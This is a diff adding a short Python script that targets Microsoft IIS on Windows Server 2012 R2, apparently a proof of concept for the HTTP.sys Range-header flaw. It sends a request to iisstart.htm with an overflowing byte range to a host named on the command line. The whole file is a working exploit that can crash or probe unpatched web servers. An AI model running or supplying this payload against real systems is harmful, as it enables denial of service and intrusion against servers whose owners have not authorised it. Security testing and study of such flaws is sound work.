@@ -1,0 +1,21 @@
+#Tested on Win Srv 2012R2.
+import socket,sys
+ 
+if len(sys.argv)<=1:	
+ sys.exit('Give me an IP')
+
+Host = sys.argv[1]
+
+def SendPayload(Payload, Host):
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((Host, 80))
+   s.send(Payload)
+   s.recv(1024)
+   s.close()
+
+#Make sure iisstart.htm exist.
+Init = "GET /iisstart.htm HTTP/1.0\r\n\r\n"
+Payload = "GET /iisstart.htm HTTP/1.1\r\nHost: blah\r\nRange: bytes=18-18446744073709551615\r\n\r\n"
+
+SendPayload(Init, Host)
+SendPayload(Payload, Host)
